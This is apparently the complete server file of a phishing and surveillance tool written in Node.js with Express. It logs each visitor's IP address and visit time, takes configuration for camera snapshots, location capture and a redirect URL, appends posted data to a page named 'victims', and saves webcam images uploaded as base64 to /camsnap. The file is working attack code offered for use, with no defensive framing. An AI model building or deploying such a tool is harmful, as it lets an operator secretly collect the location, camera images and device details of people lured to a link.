const fs = require("fs");
const path = require("path");
const express = require("express");
var bodyParser = require('body-parser');
const base64ToImage = require('base64-to-image');
const config=require('./app').config;
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(express.static("public"));
app.set("view engine", "ejs");
const logPath = path.join(__dirname, 'views', 'log.txt');
const victimsPath = path.join(__dirname, 'views', 'victims.ejs');
const imagesDir = path.join(__dirname, 'public', 'images');

app.get("/", (req, res) => {
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.render("index",{ip:ip,time:d,redirect:config.redirectURL,camera:config.camera,cams:config.camsnaps,location:config.location});
fs.appendFile(logPath,"Visit From: "+ip+" | At:"+d+"\n\n", function (err) {
if (err) throw err;
});
});
app.get("/victims",(req,res)=>{res.render("victims");});
app.post("/",(req,res)=>{
fs.appendFile(victimsPath, decodeURIComponent(req.body.data)+"\n\n", function (err) {
if (err) throw err;
console.log('Saved!');
res.send("Done");
});
});
app.post("/camsnap",(req,res)=>{
const { imageType, fileName } = base64ToImage(decodeURIComponent(req.body.img), imagesDir, { type: 'png' });
res.send(fileName);
});
app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
